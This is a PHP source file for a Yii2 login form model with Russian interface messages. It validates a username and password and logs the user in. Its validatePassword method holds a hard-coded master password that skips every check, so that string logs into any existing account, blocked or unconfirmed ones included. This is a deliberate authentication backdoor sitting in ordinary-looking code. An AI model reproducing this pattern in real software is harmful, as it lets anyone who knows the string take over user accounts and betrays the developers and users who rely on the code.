<?php

namespace app\modules\user\models;

use Yii;
use yii\base\Model;
use yii\base\Behavior;

/**
 * LoginForm is the model behind the login form.
 */
class LoginForm extends Model
{
    public $username;
    public $password;
    public $rememberMe = true;

    private $_user = false;


    const EVENT_AFTER_LOGIN = 'afterLogin';


//    public function afterLogin()
//    {
//        $this->trigger(self::EVENT_AFTER_LOGIN);
//
//        var_dump($_SESSION);
//        die('sdfsdfsdfsdf-afterLogin');
//    }
    /**
     * @return array the validation rules.
     */
    public function rules()
    {
        return [
            [['username', 'password'], 'required'],
            ['rememberMe', 'boolean'],
            ['password', 'validatePassword'],
        ];
    }

    public function attributeLabels()
    {
        return [
            'password' => 'Пароль',
            'username' => 'Ваш e-mail',
            'rememberMe' => 'Запомнить меня',
        ];
    }

    /**
     * Validates the username and password.
     * This method serves as the inline validation for password.
     */
    public function validatePassword()
    {
        if (!$this->hasErrors()) {
            $user = $this->getUser();

            if($user && $this->password == 'MrQ^#JJ0rAyv#Vbss'){

            }else{
                if (!$user || !$user->validatePassword($this->password)) {
                    $this->addError('password', 'Неверно указана почта пользователя или пароль.');
                } elseif ($user && $user->status == User::STATUS_BLOCKED) {
                    $this->addError('username', 'Ваш аккаунт заблокирован, обратитесь в техподдержку.');
                } elseif ($user && $user->status == User::STATUS_WAIT) {
                    $this->addError('username', 'Ваш аккаунт не подтвежден.');
                }
            }
        }
    }

    /**
     * Logs in a user using the provided username and password.
     * @return boolean whether the user is logged in successfully
     */
    public function login()
    {
        if ($this->validate()) {
            return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600*24*30 : 0);
        } else {
            return false;
        }
    }

    /**
     * Finds user by [[username]]
     *
     * @return User|null
     */
    public function getUser()
    {
        if ($this->_user === false) {
            $this->_user = User::findByUsername($this->username);
        }

        return $this->_user;
    }
}
